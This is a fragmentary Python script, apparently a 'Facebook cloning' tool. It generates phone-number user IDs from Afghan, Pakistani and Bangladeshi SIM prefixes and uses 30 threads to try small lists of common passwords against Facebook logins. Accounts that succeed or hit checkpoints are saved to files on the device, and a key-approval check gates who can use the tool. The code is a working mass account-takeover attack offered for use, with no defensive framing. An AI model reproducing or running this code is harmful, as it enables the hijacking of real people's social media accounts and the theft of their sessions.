...
try:
    ...
    print(' Welcome In ANONYMOUS U7P4L  Best Random Cloning System ')
...
def main():
    ...
    if adi in ["1","01"]:
       ...
       exit()
        ...
        print('\033[1;31mIncorrepct Option You Select!\3[1;31m')
        main()
...
def passx():
    ...
    print("\033[1;97m[02] \033[1;92mAuto 10  Digits Pass         \033[1;96m[FAST]")
    print("\033[1;97m[03] \033[1;92mONLY 50006000 Pass           \033[1;96m[FAST]")
    print("\033[1;97m[04] \033[1;92mONLY Afghan Pass          \033[1;96m[Slow]")
    print("\033[1;97m[05] \033[1;92mAFGHAN And Mix Pass      \033[1;96m[Slow]")
    print("\033[1;97m[06] \033[1;92mBEST Pak Pass               \033[1;96m[Best]")
    print("\033[1;97m====================================================")
    ...
    if adi in ["1","01"]:
       ...
       pass6()
        ...
        print('\033[1;31mIncorrepct Option!\3[1;31m')
        passx()
...
def pass1():
    ...
    print(f'\033[1;97m[!] \033[1;92mAFG Sim Codes \033[1;91m: \033[1;96m9377, 9379, 9376 , 9370  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR AFG [9370 / 9377 / 9379 / 9378 /9376]\033[0;m")
    print('\033[1;97m====================================================') 
    ...
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/MariOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
...
def pass2():
    ...
    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[!] \033[1;92mAFG SIM CODES \033[1;91m: \033[1;96m077, 070, 076 , 079  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR AFG [9370 / 9377 / 9379 / 9378 /9376]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
...
def pass3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['50006000','10002000','70008000']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def pass4():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['afghan123','afghan','afghan12345','Afghan123','Afghan12345']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def pass5():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['afghan12345','70008000','afghan123','afghanstan','500600']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def pass6():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['50006000','Afghan123','afghan12345','100200','700800']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'sb=-1HLYwU9wkckQY8LIZenTF2K; wd=980x1666; datr=-1HLYzr9TA7EmJmCAS7lZY1P; dpr=3; fr=0aQeYRl9dwdYVumou..Bjy1H7.4N.AAA.0.0.Bjy-16.AWUV17u3X1k',
            ...
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5401.204 Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mU7P4L-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    cid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91mU7P4L-CP\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[UMAIR] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print(f" \033[1;37mMy Key  : "+id)
      print (" Tools.. : Facebook Cloning")
      print (" Massage : Your Key Not Registered")
